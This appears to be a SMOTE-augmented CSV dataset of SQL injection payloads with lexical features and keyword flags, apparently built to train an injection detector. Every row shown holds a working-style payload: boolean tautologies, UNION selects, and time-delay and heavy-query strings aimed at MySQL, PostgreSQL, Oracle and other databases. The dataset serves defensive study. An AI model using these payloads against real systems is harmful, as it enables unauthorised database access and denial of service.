id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,other,-9975 where 9760  =  9760 order by 1--,nearest_attack_euclidean,R007221,0.2658141700846528,38.110536726832166,17.0,3.679204995765746,12.0,13.0,9.0,4.11053672683216,0.3148944394588489,0.3411356427470863,0.23617082959413666,0.10779908819992812,0.0,0.11053672683216131,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.11053672683216137,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,3.0
SMOTE_000012,attack,boolean,-6412%' or 4065  =  5815 and '%'  =  ',nearest_attack_euclidean,R006674,0.016735611481285318,38.0,16.91670870321161,3.510982890723094,5.0,12.0,12.0,9.0,0.13157894736842105,0.3157894736842105,0.3157894736842105,0.23684210526315788,4.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000913,0.10195094252645868,161.62719003606742,36.674561992786515,4.0329653586019765,55.0,26.0,60.301752028853954,20.32543800721349,0.3404597260300107,0.16094459775964143,0.37287779825325934,0.12571787795708858,4.0,0.0,1.0,0.0,0.0,2.0,0.0,8.325438007213487,0.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000014,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R002576,0.0325280699434497,63.3796605248284,21.0,3.5457593006969232,10.0,24.0,20.303728419862725,9.07593210496568,0.15784392968060595,0.37882543123345425,0.32015445377095786,0.14317618531498186,1.0,0.0,3.0,0.0,0.0,2.0,0.0,2.0759321049656814,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,boolean,"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003809,0.1298651226966494,123.14466151928148,30.0,4.0440347139455985,63.0,10.0,31.766191839408286,18.378469679873202,0.5125695487055496,0.08136024582627771,0.2568792290687482,0.14919097639942455,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.378469679873204,0.0,5.0,4.0,4.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000016,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001002,0.02987328560168017,133.3825755658138,29.0,3.8711724482561762,64.51488080171083,8.073502908831692,44.852994182336616,15.941197672934646,0.48305699348242664,0.06090110198385272,0.33647674561741453,0.11956515891630613,0.0,0.0,2.0,0.0,1.0,1.0,0.0,6.985299418233661,0.0,0.014700581766338316,1.9852994182336619,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000017,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,1.6858739404357614e-07,32.0,14.0,3.1556390622295662,3.0,11.0,12.0,6.0,0.09375,0.34375,0.375,0.1875,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_000018,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R005963,0.33192882235638743,86.20491697645645,19.62646415294724,2.921437232066282,29.16861887059632,2.0,44.12060754115828,10.91569056470184,0.3398451057549324,0.023238308707776045,0.5105507023906131,0.1263658831466785,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.91569056470184,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000019,attack,boolean,"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",nearest_attack_euclidean,R006707,0.958081355224445,187.44329761271757,31.55548809486574,3.649176780244307,117.99939285379166,12.0,43.332928569194436,14.11097618973148,0.6297262834266157,0.06415097748912098,0.23092853301088756,0.07519420607337582,0.5554880948657396,0.0,0.0,0.0,1.0,1.0,0.0,4.55548809486574,0.0,0.0,6.0,2.0,0.5554880948657396,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000020,attack,boolean,"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R006642,0.26775872851901616,55.98333028808758,21.764101627103873,3.6189914155681806,10.073076220327902,19.764101627103873,18.764101627103873,7.382050813551935,0.17927941136550027,0.3536156601334727,0.335524642505135,0.131580285995892,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.6910254067759674,0.0,0.0,0.691025406775968,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000021,attack,time,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R007781,0.3047973354142323,74.0716275959362,23.0,3.2937342161976013,19.0,10.0,34.3930229966135,10.6786045993227,0.25795105848035055,0.13576371498965817,0.46224584569493427,0.14403938083505696,1.0,0.0,2.0,0.0,0.0,1.0,0.0,5.6786045993227,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000022,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R003892,0.2615510979379092,157.47743480737347,34.0,3.8198596326606786,51.0,16.0,62.694944120605825,27.782490686767638,0.32445508975998544,0.10178983208156407,0.39727093720293377,0.1764841409555167,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.782490686767638,0.0,2.0,1.0,7.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000023,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000770,0.05126777552623752,44.0,21.395635179112553,4.037537924123236,14.0,16.0,8.0,6.0,0.3181818181818182,0.36363636363636365,0.18181818181818182,0.13636363636363635,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000024,attack,boolean,-5116  )   or   (  8287  =  4930  )  *4930,nearest_attack_euclidean,R008908,0.4696644845794237,41.56763273111483,17.78381636555741,3.2958403429305654,2.6485509033277594,16.0,17.135265462229643,5.783816365557412,0.06434754314139085,0.3850701644655731,0.4115855715795108,0.13899672081352518,0.0,0.0,1.0,0.0,0.7838163655574104,1.0,0.0,2.783816365557411,0.0,0.0,0.2161836344425896,2.7838163655574104,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000025,attack,other,"1',  (  case when 3598  =  2118 then 1 else null end  )  ",nearest_attack_euclidean,R007654,0.020017332840137122,57.0,22.862663557485057,3.6706100466744185,23.0,10.0,18.999999999999996,5.0,0.40350877192982454,0.17543859649122806,0.3333333333333333,0.08771929824561403,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,1.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,2.0
SMOTE_000026,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000262,0.0,59.0,22.0,3.6255647807017093,26.0,4.0,20.0,9.0,0.4406779661016949,0.06779661016949153,0.3389830508474576,0.15254237288135594,0.0,2.0000000000000004,2.0,0.0,1.0,2.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000027,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006933,0.7343271052036721,109.19916314134862,31.0,3.876366217251866,43.942199611059635,11.190575816506115,38.61884836698777,15.447539346795107,0.3901903584884582,0.10953731272794452,0.35733737770256946,0.1429349510810278,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.361884836698777,0.9999999999999999,0.6381151633012232,1.3618848366987768,4.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,other,1'+  (  select iutk where 6158  =  6158,nearest_attack_euclidean,R001350,0.0,39.0,20.0,3.7774884930372807,15.0,9.0,11.0,4.0,0.38461538461538464,0.23076923076923078,0.28205128205128205,0.10256410256410256,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000029,attack,boolean,"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",nearest_attack_euclidean,R003356,0.42867238964179727,61.13374612041575,23.513374612041574,3.569368290587261,7.9999999999999964,16.0,24.106996896332596,13.02674922408315,0.13174513826749837,0.26349027653499674,0.391590071370755,0.21317451382674985,4.0,0.0,1.0,0.0,0.0,2.0,0.0,3.026749224083149,2.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R008144,0.07285854079763115,73.0,24.486004924735024,3.7192523109662368,20.0,16.0,26.0,11.0,0.273972602739726,0.2191780821917808,0.3561643835616438,0.1506849315068493,4.0,0.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
